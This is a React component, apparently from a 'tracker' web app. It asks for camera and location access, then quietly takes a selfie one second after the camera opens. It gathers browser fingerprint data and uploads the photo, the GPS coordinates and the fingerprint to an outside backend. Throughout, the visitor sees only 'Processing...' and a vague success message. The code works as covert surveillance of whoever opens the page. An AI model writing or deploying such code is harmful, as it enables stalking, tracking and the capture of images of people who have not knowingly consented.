import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-backend-eta.vercel.app').replace(/\/+$/, '');

function CameraCapture({ onSuccess }) {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [status, setStatus] = useState('requesting'); // requesting, ready, capturing, success, error
  const [location, setLocation] = useState(null);
  const [browserInfo, setBrowserInfo] = useState(null);

  useEffect(() => {
    collectBrowserInfo();
    requestPermissions();
  }, []);

  useEffect(() => {
    if (status === 'ready' && videoRef.current && videoRef.current.readyState === 4) {
      // Wait a bit for the camera to stabilize then capture
      const timer = setTimeout(() => {
        captureSelfie();
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [status]);

  const collectBrowserInfo = () => {
    const info = {
      browserName: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)/)?.[0] || 'Unknown',
      os: navigator.platform,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    setBrowserInfo(info);
  };

  const requestPermissions = async () => {
    try {
      console.log('Requesting permissions...');
      // Check if mediaDevices and geolocation are available
      if (!navigator.mediaDevices || !navigator.geolocation) {
        throw new Error('Camera or location services not available. Please use HTTPS or localhost.');
      }

      console.log('Requesting camera permission...');
      // Request camera permission
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        console.log('Camera stream attached');
        // Wait for the video to load metadata
        videoRef.current.onloadedmetadata = () => {
          console.log('Video metadata loaded, requesting location...');
          // Request location permission
          navigator.geolocation.getCurrentPosition(
            (position) => {
              console.log('Location obtained:', position.coords);
              setLocation({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              });
              setStatus('ready');
            },
            (error) => {
              console.error('Location error:', error);
              setStatus('error');
            }
          );
        };
      }
    } catch (error) {
      console.error('Request permissions error:', error);
      setStatus('error');
    }
  };

  const captureSelfie = () => {
    setStatus('capturing');
    const canvas = canvasRef.current;
    const video = videoRef.current;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const imageData = canvas.toDataURL('image/png');
    uploadData(imageData);
  };

  const uploadData = async (imageData) => {
    try {
      console.log('Uploading to:', `${API_BASE_URL}/api/records`);
      
      // Convert base64 to blob
      const responseFetch = await fetch(imageData);
      const blob = await responseFetch.blob();
      
      const formData = new FormData();
      formData.append('selfie', blob, 'selfie.png');
      formData.append('location', JSON.stringify(location));
      formData.append('browserInfo', JSON.stringify(browserInfo));
      
      const response = await axios.post(`${API_BASE_URL}/api/records`, formData);
      console.log('Upload response:', response.data);
      setStatus('success');
      setTimeout(onSuccess, 2000);
    } catch (error) {
      console.error('Upload error full details:', error.response?.data || error.message);
      setStatus('error');
    }
  };

  if (status === 'error') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-red-50 to-orange-100 p-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-2xl p-8 text-center">
          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
            </svg>
          </div>
          <h1 className="text-3xl font-bold text-gray-800 mb-4">Something Went Wrong</h1>
          <p className="text-gray-600 mb-8">
            We couldn't access your camera or location. Please check your permissions and try again.
          </p>
          <button
            onClick={() => window.location.reload()}
            className="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-4 px-6 rounded-lg transition-all duration-200"
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  if (status === 'success') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 to-emerald-100 p-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-2xl p-8 text-center">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
            </svg>
          </div>
          <h1 className="text-3xl font-bold text-gray-800 mb-4">Success!</h1>
          <p className="text-gray-600">Your information has been submitted successfully.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-2xl mx-auto">
        <div className="bg-white rounded-xl shadow-2xl p-6 mb-6">
          <h1 className="text-2xl font-bold text-gray-800 mb-4 text-center">Processing...</h1>
          <div className="relative rounded-lg overflow-hidden bg-black">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="w-full"
            />
            <canvas ref={canvasRef} className="hidden" />
          </div>
        </div>

        <div className="bg-white rounded-xl shadow-2xl p-6">
          {status === 'requesting' && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <p className="text-gray-600">Requesting permissions...</p>
            </div>
          )}

          {status === 'ready' && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <p className="text-gray-600">Preparing to capture...</p>
            </div>
          )}

          {status === 'capturing' && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <p className="text-gray-600">Capturing and uploading...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default CameraCapture;
